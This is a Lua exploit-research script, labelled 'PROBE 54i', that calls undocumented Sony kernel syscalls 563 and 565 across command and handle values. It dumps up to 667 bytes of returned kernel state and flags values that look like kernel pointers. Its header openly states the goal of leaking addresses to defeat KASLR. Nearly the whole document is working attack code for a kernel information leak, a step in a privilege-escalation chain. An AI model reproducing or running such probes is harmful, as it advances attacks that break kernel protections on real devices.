-- CRASH_CLASS: MODERATE
-- PROBE 54i: sys 565 RDMSR + copyout (667 bytes of kernel state)
--
-- Context: Disassembly of the 13.60 sys 565 handler reveals:
--   - 6 RDMSR instructions reading AMD PMC MSRs (0xC0010201..0xC001020B)
--   - Stores 64-bit results at kernel object +0x190 through +0x1b8
--   - Copyout of 0x29B (667) bytes to userspace
--   - arg1 (dword @ +0): handle/ID, range-checked < 0x1869e
--   - arg2 (dword @ +8): command, validated < 6
--   - arg3 (qword @ +16): output buffer pointer
--   - sys 565 returned 0 (success) on 14.10 in probe 51a
--
-- Attack: If we find the right command value (0-5), we get 667 bytes
-- of kernel state including PMC MSR values. These may leak kernel
-- addresses or timing info useful for KASLR defeat.
-- sys 563 may need to be called first to enable PMC (sets obj+0x380=1).

print("=== PROBE 54i: SYS 565 RDMSR + COPYOUT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc563 = make_syscall(563)
local sc565 = make_syscall(565)

-- Get our PID for handle argument
local sc_getpid = make_syscall(20)
local pid = 0
do
    local ok, ret = pcall(function() return sc_getpid(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then
        pid = to_num(ret)
        print("[*] Our PID: " .. pid)
    else
        print("[!] getpid failed, using 0")
    end
end

-- Allocate output buffer (667 bytes = 0x29B, round up)
local outbuf = memory.alloc(0x1000)
-- Allocate args struct (3 x uint64 = 24 bytes)
local args = memory.alloc(64)

-- Phase 1: Try sys 563 first to enable PMC
-- sys 563 takes 1 arg (dword) which is a handle checked < 0x1869e
print("")
print("[*] Phase 1: Enable PMC via sys 563")
print("")

local handle_vals = {0, 1, pid}
for _, hval in ipairs(handle_vals) do
    local ok, ret = pcall(function()
        return sc563(uint64(hval), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        print(string.format("  563(%d) = %d (%s)", hval, signed32(ret), hexval(ret)))
    else
        print(string.format("  563(%d) CRASHED: %s", hval, tostring(ret)))
    end
end
print("")

-- Phase 2: sys 565 with all command values 0-5
-- narg=3: args passed as struct. In FreeBSD syscall ABI for Sony syscalls,
-- the args struct is pointed to by rsi. Layout:
--   +0x00: dword = handle (< 0x1869e)
--   +0x08: dword = command (< 6)
--   +0x10: qword = output buffer pointer
print("[*] Phase 2: sys 565 with commands 0-5, handle=0")
print("")

for cmd = 0, 5 do
    -- Zero output buffer
    for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

    -- Try direct args: 565(handle, cmd, outbuf)
    local ok, ret = pcall(function()
        return sc565(uint64(0), uint64(cmd), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  565(0, %d, outbuf) = %d", cmd, rv))

        if rv == 0 then
            print("  >>> SUCCESS! Scanning 667-byte output:")
            local found_nonzero = false
            for i = 0, 0x298, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        found_nonzero = true
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER!")
                        end
                    end
                end
            end
            if not found_nonzero then
                print("    (all zeros)")
            end
        end
    else
        print(string.format("  565(0, %d, outbuf) CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 3: Try with PID as handle
print("[*] Phase 3: sys 565 with handle=PID (" .. pid .. ")")
print("")

for cmd = 0, 5 do
    for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc565(uint64(pid), uint64(cmd), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  565(%d, %d, outbuf) = %d", pid, cmd, rv))

        if rv == 0 then
            print("  >>> SUCCESS! Scanning output:")
            for i = 0, 0x298, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER!")
                        end
                    end
                end
            end
        end
    else
        print(string.format("  565(%d, %d, outbuf) CRASHED: %s", pid, cmd, tostring(ret)))
    end
end
print("")

-- Phase 4: Try with args packed in a struct (in case the handler reads from a struct pointer)
-- The disassembly shows: dword from [rsi], dword from [rsi+8], qword from [rsi+0x10]
-- But FreeBSD passes first 6 syscall args in registers (rdi, rsi, rdx, rcx, r8, r9)
-- The Lua make_syscall may pass via a different convention — try struct pointer too
print("[*] Phase 4: sys 565 via struct pointer")
print("")

for cmd = 0, 5 do
    for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

    -- Build args struct
    safe_wd(args, 0)          -- handle = 0
    safe_wd(args + 4, 0)
    safe_wd(args + 8, cmd)    -- command
    safe_wd(args + 12, 0)
    safe_wq(args + 16, uint64(outbuf))  -- output buffer

    local ok, ret = pcall(function()
        return sc565(uint64(args), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  565(&{0,%d,outbuf}) = %d", cmd, rv))

        if rv == 0 then
            local found_nonzero = false
            for i = 0, 0x298, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        found_nonzero = true
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER!")
                        end
                    end
                end
            end
            if not found_nonzero then
                print("    (all zeros)")
            end
        end
    else
        print(string.format("  565(&{0,%d,outbuf}) CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 5: Try handle=1 (often means "self" in Sony syscalls)
print("[*] Phase 5: sys 565 with handle=1")
print("")

for cmd = 0, 5 do
    for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc565(uint64(1), uint64(cmd), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  565(1, %d, outbuf) = %d", cmd, rv))
        if rv == 0 then
            for i = 0, 0x298, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER!")
                        end
                    end
                end
            end
        end
    else
        print(string.format("  565(1, %d, outbuf) CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 6: Enable PMC first (563), then read (565)
print("[*] Phase 6: Enable PMC via 563(0) then read via 565(0, cmd, outbuf)")
print("")

-- Enable
pcall(function() sc563(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
pcall(function() sc563(uint64(1), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
pcall(function() sc563(uint64(pid), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

-- Now read with each command
for cmd = 0, 5 do
    for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

    local ok, ret = pcall(function()
        return sc565(uint64(0), uint64(cmd), uint64(outbuf), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local nonzero_count = 0
        for i = 0, 0x298, 8 do
            local qv = safe_rq(outbuf + i)
            if qv then
                local h, l = get_hi_lo(qv)
                if h ~= 0 or l ~= 0 then nonzero_count = nonzero_count + 1 end
            end
        end
        print(string.format("  565(0, %d, outbuf) = %d  nonzero_qwords=%d", cmd, rv, nonzero_count))

        -- Dump PMC offset range specifically (0x190-0x1b8 in the kernel object)
        -- These would appear at some offset in the copyout buffer
        if rv == 0 and nonzero_count > 0 then
            print("  Full non-zero dump:")
            for i = 0, 0x298, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +0x%03X: %s", i, hexval(qv)))
                        if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                            print("    >>> KERNEL POINTER CANDIDATE!")
                        end
                    end
                end
            end
        end
    else
        print(string.format("  565(0, %d, outbuf) CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 7: Full buffer dump for the first successful call
print("[*] Phase 7: Raw hex dump of first 256 bytes from 565(0,0,outbuf)")
print("")
for i = 0, 0x2A0, 4 do safe_wd(outbuf + i, 0) end

pcall(function() sc563(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
local ok, ret = pcall(function()
    return sc565(uint64(0), uint64(0), uint64(outbuf), uint64(0), uint64(0), uint64(0))
end)
if ok then
    print("  ret = " .. signed32(ret))
    -- Hex dump first 256 bytes
    for row = 0, 248, 8 do
        local b = {}
        for j = 0, 7 do
            local v = safe_rd(outbuf + row + j)
            if v then
                table.insert(b, string.format("%02X", v % 256))
            else
                table.insert(b, "??")
            end
        end
        -- Read as dwords for readability
        local d0 = safe_rd(outbuf + row) or 0
        local d1 = safe_rd(outbuf + row + 4) or 0
        print(string.format("  +0x%03X: %08X %08X", row, d0, d1))
    end
end

print("")
print("=== PROBE 54i COMPLETE ===")
